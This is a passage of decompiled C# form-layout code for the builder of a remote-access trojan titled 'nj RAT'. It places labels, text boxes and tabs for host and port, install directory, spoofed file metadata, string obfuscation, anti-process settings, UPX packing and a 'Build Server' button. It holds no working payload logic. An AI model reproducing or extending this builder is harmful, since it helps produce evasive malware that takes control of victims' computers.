			Control arg_3CEE_0 = this.exe;
			location = new Point(22, 138);
			arg_3CEE_0.Location = location;
			this.exe.Name = "exe";
			Control arg_3D1C_0 = this.exe;
			size = new Size(208, 22);
			arg_3D1C_0.Size = size;
			this.exe.TabIndex = 28;
			this.exe.Text = "Chrome.exe";
			this.Label16.AutoSize = true;
			this.Label16.BackColor = Color.Transparent;
			this.Label16.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label16.ForeColor = Color.Yellow;
			Control arg_3DA8_0 = this.Label16;
			location = new Point(680, 219);
			arg_3DA8_0.Location = location;
			this.Label16.Name = "Label16";
			Control arg_3DD3_0 = this.Label16;
			size = new Size(80, 16);
			arg_3DD3_0.Size = size;
			this.Label16.TabIndex = 27;
			this.Label16.Text = "port encription";
			this.Label16.TextAlign = ContentAlignment.TopCenter;
			this.Label15.AutoSize = true;
			this.Label15.BackColor = Color.Transparent;
			this.Label15.Font = new Font("Palatino Linotype", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label15.ForeColor = Color.Yellow;
			Control arg_3E6C_0 = this.Label15;
			location = new Point(676, 152);
			arg_3E6C_0.Location = location;
			this.Label15.Name = "Label15";
			Control arg_3E97_0 = this.Label15;
			size = new Size(84, 16);
			arg_3E97_0.Size = size;
			this.Label15.TabIndex = 26;
			this.Label15.Text = "Host encription";
			this.Label15.TextAlign = ContentAlignment.TopCenter;
			this.txt_port.BackColor = Color.Black;
			this.txt_port.BorderStyle = BorderStyle.FixedSingle;
			this.txt_port.ForeColor = Color.Lime;
			Control arg_3F12_0 = this.txt_port;
			location = new Point(624, 246);
			arg_3F12_0.Location = location;
			this.txt_port.Name = "txt_port";
			this.txt_port.ReadOnly = true;
			Control arg_3F4D_0 = this.txt_port;
			size = new Size(149, 21);
			arg_3F4D_0.Size = size;
			this.txt_port.TabIndex = 25;
			this.txt_encription.BackColor = Color.Black;
			this.txt_encription.BorderStyle = BorderStyle.FixedSingle;
			this.txt_encription.ForeColor = Color.Lime;
			Control arg_3FAA_0 = this.txt_encription;
			location = new Point(624, 183);
			arg_3FAA_0.Location = location;
			this.txt_encription.Name = "txt_encription";
			this.txt_encription.ReadOnly = true;
			Control arg_3FE5_0 = this.txt_encription;
			size = new Size(149, 21);
			arg_3FE5_0.Size = size;
			this.txt_encription.TabIndex = 23;
			this.TabPage2.BackColor = Color.Black;
			this.TabPage2.Controls.Add(this.Label7);
			this.TabPage2.Controls.Add(this.GroupBox3);
			this.TabPage2.ImageKey = "Tpdkdesign.net-Refresh-Cl-System-Install-1.ico";
			TabPage arg_405C_0 = this.TabPage2;
			location = new Point(4, 27);
			arg_405C_0.Location = location;
			this.TabPage2.Name = "TabPage2";
			Control arg_4084_0 = this.TabPage2;
			padding = new Padding(3);
			arg_4084_0.Padding = padding;
			Control arg_40A4_0 = this.TabPage2;
			size = new Size(441, 200);
			arg_40A4_0.Size = size;
			this.TabPage2.TabIndex = 1;
			this.TabPage2.Text = "Install";
			this.Label7.AutoSize = true;
			this.Label7.BackColor = Color.Black;
			this.Label7.Font = new Font("Tahoma", 12f, FontStyle.Bold | FontStyle.Underline, GraphicsUnit.Point, 0);
			this.Label7.ForeColor = Color.Yellow;
			Control arg_412C_0 = this.Label7;
			location = new Point(141, 76);
			arg_412C_0.Location = location;
			this.Label7.Name = "Label7";
			Control arg_415A_0 = this.Label7;
			size = new Size(146, 19);
			arg_415A_0.Size = size;
			this.Label7.TabIndex = 45;
			this.Label7.Text = "Install Derectory";
			this.TabPage3.BackColor = Color.Black;
			this.TabPage3.Controls.Add(this.PictureBox3);
			this.TabPage3.Controls.Add(this.GroupBox5);
			this.TabPage3.Controls.Add(this.PictureBox2);
			this.TabPage3.ImageKey = "Bahamut_Shield.ico";
			TabPage arg_41F9_0 = this.TabPage3;
			location = new Point(4, 27);
			arg_41F9_0.Location = location;
			this.TabPage3.Name = "TabPage3";
			Control arg_422A_0 = this.TabPage3;
			size = new Size(441, 200);
			arg_422A_0.Size = size;
			this.TabPage3.TabIndex = 2;
			this.TabPage3.Text = "Shield";
			this.TabPage4.BackColor = Color.Black;
			this.TabPage4.Controls.Add(this.GroupBox4);
			this.TabPage4.ImageKey = "01.png";
			TabPage arg_429A_0 = this.TabPage4;
			location = new Point(4, 27);
			arg_429A_0.Location = location;
			this.TabPage4.Name = "TabPage4";
			Control arg_42CB_0 = this.TabPage4;
			size = new Size(441, 200);
			arg_42CB_0.Size = size;
			this.TabPage4.TabIndex = 3;
			this.TabPage4.Text = "Description";
			this.GroupBox4.BackColor = Color.Black;
			this.GroupBox4.Controls.Add(this.TextBox3);
			this.GroupBox4.Controls.Add(this.Label14);
			this.GroupBox4.Controls.Add(this.TextBox4);
			this.GroupBox4.Controls.Add(this.Label13);
			this.GroupBox4.Controls.Add(this.TextBox5);
			this.GroupBox4.Controls.Add(this.Num8);
			this.GroupBox4.Controls.Add(this.TextBox6);
			this.GroupBox4.Controls.Add(this.Num7);
			this.GroupBox4.Controls.Add(this.Label8);
			this.GroupBox4.Controls.Add(this.Num6);
			this.GroupBox4.Controls.Add(this.Label9);
			this.GroupBox4.Controls.Add(this.Num5);
			this.GroupBox4.Controls.Add(this.Label10);
			this.GroupBox4.Controls.Add(this.Num4);
			this.GroupBox4.Controls.Add(this.Label11);
			this.GroupBox4.Controls.Add(this.Num3);
			this.GroupBox4.Controls.Add(this.Label12);
			this.GroupBox4.Controls.Add(this.Num2);
			this.GroupBox4.Controls.Add(this.Num1);
			this.GroupBox4.Enabled = false;
			this.GroupBox4.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.GroupBox4.ForeColor = Color.White;
			Control arg_4508_0 = this.GroupBox4;
			location = new Point(149, 17);
			arg_4508_0.Location = location;
			this.GroupBox4.Name = "GroupBox4";
			Control arg_4539_0 = this.GroupBox4;
			size = new Size(401, 261);
			arg_4539_0.Size = size;
			this.GroupBox4.TabIndex = 49;
			this.GroupBox4.TabStop = false;
			this.GroupBox4.Text = "Description";
			this.TextBox3.BackColor = Color.Black;
			this.TextBox3.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox3.ForeColor = Color.White;
			Control arg_45AE_0 = this.TextBox3;
			location = new Point(85, 47);
			arg_45AE_0.Location = location;
			this.TextBox3.Name = "TextBox3";
			Control arg_45DC_0 = this.TextBox3;
			size = new Size(279, 22);
			arg_45DC_0.Size = size;
			this.TextBox3.TabIndex = 19;
			this.Label14.AutoSize = true;
			this.Label14.BackColor = Color.Black;
			this.Label14.ForeColor = Color.White;
			Control arg_4636_0 = this.Label14;
			location = new Point(15, 159);
			arg_4636_0.Location = location;
			this.Label14.Name = "Label14";
			Control arg_4661_0 = this.Label14;
			size = new Size(55, 13);
			arg_4661_0.Size = size;
			this.Label14.TabIndex = 37;
			this.Label14.Text = "S.Version";
			this.TextBox4.BackColor = Color.Black;
			this.TextBox4.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox4.ForeColor = Color.White;
			Control arg_46C9_0 = this.TextBox4;
			location = new Point(85, 74);
			arg_46C9_0.Location = location;
			this.TextBox4.Name = "TextBox4";
			Control arg_46F7_0 = this.TextBox4;
			size = new Size(279, 22);
			arg_46F7_0.Size = size;
			this.TextBox4.TabIndex = 20;
			this.Label13.AutoSize = true;
			this.Label13.BackColor = Color.Black;
			this.Label13.ForeColor = Color.White;
			Control arg_4751_0 = this.Label13;
			location = new Point(17, 185);
			arg_4751_0.Location = location;
			this.Label13.Name = "Label13";
			Control arg_477C_0 = this.Label13;
			size = new Size(54, 13);
			arg_477C_0.Size = size;
			this.Label13.TabIndex = 36;
			this.Label13.Text = "F.version";
			this.TextBox5.BackColor = Color.Black;
			this.TextBox5.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox5.ForeColor = Color.White;
			Control arg_47E4_0 = this.TextBox5;
			location = new Point(85, 101);
			arg_47E4_0.Location = location;
			this.TextBox5.Name = "TextBox5";
			Control arg_4812_0 = this.TextBox5;
			size = new Size(279, 22);
			arg_4812_0.Size = size;
			this.TextBox5.TabIndex = 21;
			this.Num8.BackColor = Color.Black;
			this.Num8.BorderStyle = BorderStyle.FixedSingle;
			this.Num8.ForeColor = Color.White;
			Control arg_486F_0 = this.Num8;
			location = new Point(298, 183);
			arg_486F_0.Location = location;
			NumericUpDown arg_48A4_0 = this.Num8;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_48A4_0.Maximum = num;
			this.Num8.Name = "Num8";
			Control arg_48CF_0 = this.Num8;
			size = new Size(65, 22);
			arg_48CF_0.Size = size;
			this.Num8.TabIndex = 35;
			this.TextBox6.BackColor = Color.Black;
			this.TextBox6.BorderStyle = BorderStyle.FixedSingle;
			this.TextBox6.ForeColor = Color.White;
			Control arg_4929_0 = this.TextBox6;
			location = new Point(85, 128);
			arg_4929_0.Location = location;
			this.TextBox6.Name = "TextBox6";
			Control arg_4957_0 = this.TextBox6;
			size = new Size(279, 22);
			arg_4957_0.Size = size;
			this.TextBox6.TabIndex = 22;
			this.Num7.BackColor = Color.Black;
			this.Num7.BorderStyle = BorderStyle.FixedSingle;
			this.Num7.ForeColor = Color.White;
			Control arg_49B4_0 = this.Num7;
			location = new Point(227, 183);
			arg_49B4_0.Location = location;
			NumericUpDown arg_49E9_0 = this.Num7;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_49E9_0.Maximum = num;
			this.Num7.Name = "Num7";
			Control arg_4A14_0 = this.Num7;
			size = new Size(65, 22);
			arg_4A14_0.Size = size;
			this.Num7.TabIndex = 34;
			this.Label8.AutoSize = true;
			this.Label8.BackColor = Color.Black;
			this.Label8.ForeColor = Color.White;
			Control arg_4A6B_0 = this.Label8;
			location = new Point(28, 23);
			arg_4A6B_0.Location = location;
			this.Label8.Name = "Label8";
			Control arg_4A96_0 = this.Label8;
			size = new Size(38, 13);
			arg_4A96_0.Size = size;
			this.Label8.TabIndex = 23;
			this.Label8.Text = "Name";
			this.Num6.BackColor = Color.Black;
			this.Num6.BorderStyle = BorderStyle.FixedSingle;
			this.Num6.ForeColor = Color.White;
			Control arg_4B04_0 = this.Num6;
			location = new Point(156, 183);
			arg_4B04_0.Location = location;
			NumericUpDown arg_4B39_0 = this.Num6;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_4B39_0.Maximum = num;
			this.Num6.Name = "Num6";
			Control arg_4B64_0 = this.Num6;
			size = new Size(65, 22);
			arg_4B64_0.Size = size;
			this.Num6.TabIndex = 33;
			this.Label9.AutoSize = true;
			this.Label9.BackColor = Color.Black;
			this.Label9.ForeColor = Color.White;
			Control arg_4BBA_0 = this.Label9;
			location = new Point(8, 50);
			arg_4BBA_0.Location = location;
			this.Label9.Name = "Label9";
			Control arg_4BE5_0 = this.Label9;
			size = new Size(66, 13);
			arg_4BE5_0.Size = size;
			this.Label9.TabIndex = 24;
			this.Label9.Text = "Description";
			this.Num5.BackColor = Color.Black;
			this.Num5.BorderStyle = BorderStyle.FixedSingle;
			this.Num5.ForeColor = Color.White;
			Control arg_4C50_0 = this.Num5;
			location = new Point(85, 183);
			arg_4C50_0.Location = location;
			NumericUpDown arg_4C85_0 = this.Num5;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_4C85_0.Maximum = num;
			this.Num5.Name = "Num5";
			Control arg_4CB0_0 = this.Num5;
			size = new Size(65, 22);
			arg_4CB0_0.Size = size;
			this.Num5.TabIndex = 32;
			this.Label10.AutoSize = true;
			this.Label10.BackColor = Color.Black;
			this.Label10.ForeColor = Color.White;
			Control arg_4D07_0 = this.Label10;
			location = new Point(23, 77);
			arg_4D07_0.Location = location;
			this.Label10.Name = "Label10";
			Control arg_4D32_0 = this.Label10;
			size = new Size(48, 13);
			arg_4D32_0.Size = size;
			this.Label10.TabIndex = 25;
			this.Label10.Text = "Product";
			this.Num4.BackColor = Color.Black;
			this.Num4.BorderStyle = BorderStyle.FixedSingle;
			this.Num4.ForeColor = Color.White;
			Control arg_4DA0_0 = this.Num4;
			location = new Point(298, 155);
			arg_4DA0_0.Location = location;
			NumericUpDown arg_4DD5_0 = this.Num4;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_4DD5_0.Maximum = num;
			this.Num4.Name = "Num4";
			Control arg_4E00_0 = this.Num4;
			size = new Size(65, 22);
			arg_4E00_0.Size = size;
			this.Num4.TabIndex = 31;
			this.Label11.AutoSize = true;
			this.Label11.BackColor = Color.Black;
			this.Label11.ForeColor = Color.White;
			Control arg_4E57_0 = this.Label11;
			location = new Point(16, 104);
			arg_4E57_0.Location = location;
			this.Label11.Name = "Label11";
			Control arg_4E82_0 = this.Label11;
			size = new Size(57, 13);
			arg_4E82_0.Size = size;
			this.Label11.TabIndex = 26;
			this.Label11.Text = "Company";
			this.Num3.BackColor = Color.Black;
			this.Num3.BorderStyle = BorderStyle.FixedSingle;
			this.Num3.ForeColor = Color.White;
			Control arg_4EF0_0 = this.Num3;
			location = new Point(227, 155);
			arg_4EF0_0.Location = location;
			NumericUpDown arg_4F25_0 = this.Num3;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_4F25_0.Maximum = num;
			this.Num3.Name = "Num3";
			Control arg_4F50_0 = this.Num3;
			size = new Size(65, 22);
			arg_4F50_0.Size = size;
			this.Num3.TabIndex = 30;
			this.Label12.AutoSize = true;
			this.Label12.BackColor = Color.Black;
			this.Label12.ForeColor = Color.White;
			Control arg_4FAA_0 = this.Label12;
			location = new Point(12, 131);
			arg_4FAA_0.Location = location;
			this.Label12.Name = "Label12";
			Control arg_4FD5_0 = this.Label12;
			size = new Size(66, 13);
			arg_4FD5_0.Size = size;
			this.Label12.TabIndex = 27;
			this.Label12.Text = "Description";
			this.Num2.BackColor = Color.Black;
			this.Num2.BorderStyle = BorderStyle.FixedSingle;
			this.Num2.ForeColor = Color.White;
			Control arg_5043_0 = this.Num2;
			location = new Point(156, 155);
			arg_5043_0.Location = location;
			NumericUpDown arg_5078_0 = this.Num2;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_5078_0.Maximum = num;
			this.Num2.Name = "Num2";
			Control arg_50A3_0 = this.Num2;
			size = new Size(65, 22);
			arg_50A3_0.Size = size;
			this.Num2.TabIndex = 29;
			this.Num1.BackColor = Color.Black;
			this.Num1.BorderStyle = BorderStyle.FixedSingle;
			this.Num1.ForeColor = Color.White;
			Control arg_50FD_0 = this.Num1;
			location = new Point(85, 155);
			arg_50FD_0.Location = location;
			NumericUpDown arg_5132_0 = this.Num1;
			num = new decimal(new int[]
			{
				9,
				0,
				0,
				0
			});
			arg_5132_0.Maximum = num;
			this.Num1.Name = "Num1";
			Control arg_515D_0 = this.Num1;
			size = new Size(65, 22);
			arg_515D_0.Size = size;
			this.Num1.TabIndex = 28;
			this.TabPage8.BackColor = Color.Black;
			this.TabPage8.Controls.Add(this.CheckBox3);
			this.TabPage8.Controls.Add(this.GroupBox11);
			this.TabPage8.ImageKey = "Aha-Soft-Torrent-Virus.ico";
			TabPage arg_51D4_0 = this.TabPage8;
			location = new Point(4, 27);
			arg_51D4_0.Location = location;
			this.TabPage8.Name = "TabPage8";
			Control arg_51FC_0 = this.TabPage8;
			padding = new Padding(3);
			arg_51FC_0.Padding = padding;
			Control arg_521C_0 = this.TabPage8;
			size = new Size(441, 200);
			arg_521C_0.Size = size;
			this.TabPage8.TabIndex = 7;
			this.TabPage8.Text = "Obfuscation";
			this.CheckBox3.AutoSize = true;
			this.CheckBox3.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CheckBox3.ForeColor = Color.White;
			Control arg_528F_0 = this.CheckBox3;
			location = new Point(13, 6);
			arg_528F_0.Location = location;
			this.CheckBox3.Name = "CheckBox3";
			Control arg_52BA_0 = this.CheckBox3;
			size = new Size(68, 21);
			arg_52BA_0.Size = size;
			this.CheckBox3.TabIndex = 1;
			this.CheckBox3.Text = "Enable";
			this.CheckBox3.UseVisualStyleBackColor = true;
			this.GroupBox11.Controls.Add(this.Label19);
			this.GroupBox11.Controls.Add(this.CM_Obfs);
			this.GroupBox11.Controls.Add(this.NumericUpDown1);
			this.GroupBox11.Controls.Add(this.txtStringOfuscador);
			this.GroupBox11.Controls.Add(this.Rpool);
			this.GroupBox11.Enabled = false;
			this.GroupBox11.ForeColor = Color.White;
			Control arg_5390_0 = this.GroupBox11;
			location = new Point(48, 23);
			arg_5390_0.Location = location;
			this.GroupBox11.Name = "GroupBox11";
			Control arg_53C1_0 = this.GroupBox11;
			size = new Size(617, 262);
			arg_53C1_0.Size = size;
			this.GroupBox11.TabIndex = 37;
			this.GroupBox11.TabStop = false;
			this.GroupBox11.Text = "RandomST";
			this.Label19.AutoSize = true;
			this.Label19.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Label19.ForeColor = Color.White;
			Control arg_5449_0 = this.Label19;
			location = new Point(416, 135);
			arg_5449_0.Location = location;
			this.Label19.Name = "Label19";
			Control arg_5474_0 = this.Label19;
			size = new Size(67, 13);
			arg_5474_0.Size = size;
			this.Label19.TabIndex = 36;
			this.Label19.Text = "Max length";
			this.CM_Obfs.BackColor = Color.Black;
			this.CM_Obfs.DropDownStyle = ComboBoxStyle.DropDownList;
			this.CM_Obfs.FlatStyle = FlatStyle.Flat;
			this.CM_Obfs.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CM_Obfs.ForeColor = Color.White;
			this.CM_Obfs.FormattingEnabled = true;
			this.CM_Obfs.Items.AddRange(new object[]
			{
				"-Native resource",
				"-Managed resource",
				"-Random Resource"
			});
			Control arg_5550_0 = this.CM_Obfs;
			location = new Point(13, 131);
			arg_5550_0.Location = location;
			this.CM_Obfs.Name = "CM_Obfs";
			Control arg_557E_0 = this.CM_Obfs;
			size = new Size(386, 21);
			arg_557E_0.Size = size;
			this.CM_Obfs.TabIndex = 35;
			this.NumericUpDown1.BackColor = Color.Black;
			this.NumericUpDown1.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.NumericUpDown1.ForeColor = Color.White;
			Control arg_55EC_0 = this.NumericUpDown1;
			location = new Point(489, 129);
			arg_55EC_0.Location = location;
			NumericUpDown arg_5628_0 = this.NumericUpDown1;
			num = new decimal(new int[]
			{
				-727379969,
				232,
				0,
				0
			});
			arg_5628_0.Maximum = num;
			this.NumericUpDown1.Name = "NumericUpDown1";
			Control arg_5653_0 = this.NumericUpDown1;
			size = new Size(112, 25);
			arg_5653_0.Size = size;
			this.NumericUpDown1.TabIndex = 3;
			this.NumericUpDown1.TextAlign = HorizontalAlignment.Center;
			NumericUpDown arg_56A5_0 = this.NumericUpDown1;
			num = new decimal(new int[]
			{
				600,
				0,
				0,
				0
			});
			arg_56A5_0.Value = num;
			this.txtStringOfuscador.BackColor = Color.Black;
			this.txtStringOfuscador.BorderStyle = BorderStyle.FixedSingle;
			this.txtStringOfuscador.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.txtStringOfuscador.ForeColor = Color.White;
			Control arg_570F_0 = this.txtStringOfuscador;
			location = new Point(13, 175);
			arg_570F_0.Location = location;
			this.txtStringOfuscador.Multiline = true;
			this.txtStringOfuscador.Name = "txtStringOfuscador";
			Control arg_574A_0 = this.txtStringOfuscador;
			size = new Size(589, 79);
			arg_574A_0.Size = size;
			this.txtStringOfuscador.TabIndex = 2;
			this.Rpool.ForeColor = Color.White;
			Control arg_5782_0 = this.Rpool;
			location = new Point(13, 23);
			arg_5782_0.Location = location;
			this.Rpool.Name = "Rpool";
			Control arg_57B0_0 = this.Rpool;
			size = new Size(589, 97);
			arg_57B0_0.Size = size;
			this.Rpool.TabIndex = 0;
			this.Rpool.Text = "NsRandomPool1";
			this.TabPage5.BackColor = Color.Black;
			this.TabPage5.Controls.Add(this.GroupBox1);
			this.TabPage5.ImageKey = "Shield.ico";
			TabPage arg_5820_0 = this.TabPage5;
			location = new Point(4, 27);
			arg_5820_0.Location = location;
			this.TabPage5.Name = "TabPage5";
			Control arg_5851_0 = this.TabPage5;
			size = new Size(441, 200);
			arg_5851_0.Size = size;
			this.TabPage5.TabIndex = 4;
			this.TabPage5.Text = "Antis Process";
			this.GroupBox1.BackColor = Color.Black;
			this.GroupBox1.ForeColor = Color.White;
			Control arg_58AB_0 = this.GroupBox1;
			location = new Point(47, 12);
			arg_58AB_0.Location = location;
			this.GroupBox1.Name = "GroupBox1";
			Control arg_58DC_0 = this.GroupBox1;
			size = new Size(607, 270);
			arg_58DC_0.Size = size;
			this.GroupBox1.TabIndex = 1;
			this.GroupBox1.TabStop = false;
			this.GroupBox1.Text = "Anti Process";
			this.TabPage6.BackColor = Color.Black;
			this.TabPage6.Controls.Add(this.GroupBox6);
			this.TabPage6.Controls.Add(this.GroupBox2);
			this.TabPage6.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.TabPage6.ImageKey = "windows.ico";
			TabPage arg_598E_0 = this.TabPage6;
			location = new Point(4, 27);
			arg_598E_0.Location = location;
			this.TabPage6.Name = "TabPage6";
			Control arg_59BF_0 = this.TabPage6;
			size = new Size(441, 200);
			arg_59BF_0.Size = size;
			this.TabPage6.TabIndex = 5;
			this.TabPage6.Text = "Other";
			this.TabPage7.BackColor = Color.Black;
			this.TabPage7.Controls.Add(this.PictureBox4);
			this.TabPage7.Controls.Add(this.CKUpx);
			this.TabPage7.Controls.Add(this.GroupBox7);
			this.TabPage7.Controls.Add(this.NyX_Button1);
			this.TabPage7.ImageKey = "true.ico";
			TabPage arg_5A74_0 = this.TabPage7;
			location = new Point(4, 27);
			arg_5A74_0.Location = location;
			this.TabPage7.Name = "TabPage7";
			Control arg_5AA5_0 = this.TabPage7;
			size = new Size(441, 200);
			arg_5AA5_0.Size = size;
			this.TabPage7.TabIndex = 6;
			this.TabPage7.Text = "Final";
			this.PictureBox4.Image = (Image)componentResourceManager.GetObject("PictureBox4.Image");
			Control arg_5AFF_0 = this.PictureBox4;
			location = new Point(523, 251);
			arg_5AFF_0.Location = location;
			this.PictureBox4.Name = "PictureBox4";
			Control arg_5B2A_0 = this.PictureBox4;
			size = new Size(45, 40);
			arg_5B2A_0.Size = size;
			this.PictureBox4.SizeMode = PictureBoxSizeMode.StretchImage;
			this.PictureBox4.TabIndex = 48;
			this.PictureBox4.TabStop = false;
			this.CKUpx.AutoSize = true;
			this.CKUpx.BackColor = Color.Black;
			this.CKUpx.Font = new Font("Segoe UI Symbol", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.CKUpx.ForeColor = Color.White;
			Control arg_5BBF_0 = this.CKUpx;
			location = new Point(576, 263);
			arg_5BBF_0.Location = location;
			this.CKUpx.Name = "CKUpx";
			Control arg_5BEA_0 = this.CKUpx;
			size = new Size(115, 17);
			arg_5BEA_0.Size = size;
			this.CKUpx.TabIndex = 47;
			this.CKUpx.Text = "Compress(UPX)";
			this.CKUpx.UseVisualStyleBackColor = false;
			this.NyX_Button1.Colors = new Bloom[0];
			this.NyX_Button1.Cursor = Cursors.Hand;
			this.NyX_Button1.Customization = "";
			this.NyX_Button1.Font = new Font("Segoe UI", 14.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.NyX_Button1.Image = null;
			Control arg_5C91_0 = this.NyX_Button1;
			location = new Point(6, 250);
			arg_5C91_0.Location = location;
			this.NyX_Button1.Name = "NyX_Button1";
			this.NyX_Button1.NoRounding = false;
			Control arg_5CCC_0 = this.NyX_Button1;
			size = new Size(511, 44);
			arg_5CCC_0.Size = size;
			this.NyX_Button1.TabIndex = 37;
			this.NyX_Button1.Text = "Build Server";
			this.NyX_Button1.Transparent = false;
			this.imm.ImageStream = (ImageListStreamer)componentResourceManager.GetObject("imm.ImageStream");
			this.imm.TransparentColor = Color.Transparent;
			this.imm.Images.SetKeyName(0, "6.png");
			this.imm.Images.SetKeyName(1, "Hopstarter-Sleek-Xp-Basic-Download.ico");
			this.imm.Images.SetKeyName(2, "Bahamut_Shield.ico");
			this.imm.Images.SetKeyName(3, "01.png");
			this.imm.Images.SetKeyName(4, "windows.ico");
			this.imm.Images.SetKeyName(5, "true.ico");
			this.imm.Images.SetKeyName(6, "Tpdkdesign.net-Refresh-Cl-System-Install-1.ico");
			this.imm.Images.SetKeyName(7, "baaupdate_1.ico");
			this.imm.Images.SetKeyName(8, "Oxygen-Icons.org-Oxygen-Actions-fill-color.ico");
			this.imm.Images.SetKeyName(9, "Aha-Soft-Torrent-Virus.ico");
			this.imm.Images.SetKeyName(10, "Z Cobra.ico");
			this.imm.Images.SetKeyName(11, "Shield.ico");
			this.NyX_Theme1.Animated = true;
			this.NyX_Theme1.BackColor = Color.Black;
			this.NyX_Theme1.BorderStyle = FormBorderStyle.SizableToolWindow;
			this.NyX_Theme1.Colors = new Bloom[0];
			this.NyX_Theme1.Controls.Add(this.NyX_ControlBox1);
			this.NyX_Theme1.Controls.Add(this.NyX_ProgressBar1);
			this.NyX_Theme1.Controls.Add(this.Anti_CH);
			this.NyX_Theme1.Controls.Add(this.Note);
			this.NyX_Theme1.Customization = "";
			this.NyX_Theme1.Dock = DockStyle.Fill;
			this.NyX_Theme1.Font = new Font("Arial", 9f);
			this.NyX_Theme1.Image = null;
			Control arg_5F33_0 = this.NyX_Theme1;
			location = new Point(0, 0);
			arg_5F33_0.Location = location;
			this.NyX_Theme1.Movable = false;
			this.NyX_Theme1.Name = "NyX_Theme1";
			this.NyX_Theme1.NoRounding = false;
			this.NyX_Theme1.Sizable = false;
			Control arg_5F8B_0 = this.NyX_Theme1;
			size = new Size(448, 206);
			arg_5F8B_0.Size = size;
			this.NyX_Theme1.SmartBounds = true;
			this.NyX_Theme1.StartPosition = FormStartPosition.CenterScreen;
			this.NyX_Theme1.TabIndex = 49;
			this.NyX_Theme1.Text = "nj RAT";
			this.NyX_Theme1.TransparencyKey = Color.Fuchsia;
			this.NyX_Theme1.Transparent = false;
			this.NyX_ControlBox1.BackColor = Color.Black;
			this.NyX_ControlBox1.Colors = new Bloom[0];
			this.NyX_ControlBox1.Customization = "";
			this.NyX_ControlBox1.Font = new Font("Verdana", 8f);
			this.NyX_ControlBox1.Image = null;
			Control arg_605A_0 = this.NyX_ControlBox1;
			location = new Point(670, 1);
			arg_605A_0.Location = location;
			this.NyX_ControlBox1.Name = "NyX_ControlBox1";
			this.NyX_ControlBox1.NoRounding = false;
			Control arg_6092_0 = this.NyX_ControlBox1;
			size = new Size(56, 22);
			arg_6092_0.Size = size;
			this.NyX_ControlBox1.TabIndex = 2;
			this.NyX_ControlBox1.Text = "NyX_ControlBox1";
			this.NyX_ControlBox1.Transparent = false;
			this.NyX_ProgressBar1.Colors = new Bloom[0];
			this.NyX_ProgressBar1.Customization = "";
			this.NyX_ProgressBar1.Font = new Font("Verdana", 8f);
			this.NyX_ProgressBar1.Image = null;
			Control arg_6125_0 = this.NyX_ProgressBar1;
			location = new Point(-9, 196);
			arg_6125_0.Location = location;
			this.NyX_ProgressBar1.Maximum = 100;
			this.NyX_ProgressBar1.Name = "NyX_ProgressBar1";
			this.NyX_ProgressBar1.NoRounding = false;
			Control arg_616E_0 = this.NyX_ProgressBar1;
			size = new Size(458, 17);
			arg_616E_0.Size = size;
			this.NyX_ProgressBar1.TabIndex = 1;
			this.NyX_ProgressBar1.Text = "NyX_ProgressBar1";
			this.NyX_ProgressBar1.Transparent = false;
			this.NyX_ProgressBar1.Value = 100;
			this.Anti_CH.AutoSize = true;
			this.Anti_CH.BackColor = Color.Black;
			this.Anti_CH.Font = new Font("Segoe UI", 9.75f, FontStyle.Bold | FontStyle.Italic, GraphicsUnit.Point, 0);
			this.Anti_CH.ForeColor = Color.LightSteelBlue;
			Control arg_6214_0 = this.Anti_CH;
			location = new Point(1217, 420);
			arg_6214_0.Location = location;
			this.Anti_CH.Name = "Anti_CH";
			Control arg_623F_0 = this.Anti_CH;
			size = new Size(76, 21);
			arg_623F_0.Size = size;
			this.Anti_CH.TabIndex = 32;
			this.Anti_CH.Text = " Process";
			this.Anti_CH.UseVisualStyleBackColor = false;
			this.Note.AutoSize = true;
			this.Note.BackColor = Color.Black;
			this.Note.Font = new Font("Segoe UI", 9f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.Note.ForeColor = Color.Lime;
			Control arg_62D8_0 = this.Note;
			location = new Point(1209, 389);
			arg_62D8_0.Location = location;
			this.Note.Name = "Note";
			Control arg_6303_0 = this.Note;
			size = new Size(84, 15);
			arg_6303_0.Size = size;
			this.Note.TabIndex = 33;
			this.Note.Text = " Click Process ";
			this.Note.Visible = false;
			SizeF autoScaleDimensions = new SizeF(7f, 13f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			this.BackColor = Color.Black;
			size = new Size(448, 206);
			this.ClientSize = size;
			this.Controls.Add(this.TabControl1);
			this.Controls.Add(this.T1);
			this.Controls.Add(this.rnz);
			this.Controls.Add(this.NyX_Theme1);
			this.Font = new Font("Tahoma", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
			this.ForeColor = Color.DeepSkyBlue;
			this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
			this.Icon = (Icon)componentResourceManager.GetObject("$this.Icon");
			this.Name = "Frm_Builder";
			this.StartPosition = FormStartPosition.CenterScreen;
			this.Text = " Builder";
			this.TransparencyKey = Color.Fuchsia;
			((ISupportInitialize)this.port).EndInit();
			this.GroupBox3.ResumeLayout(false);
			this.GroupBox3.PerformLayout();
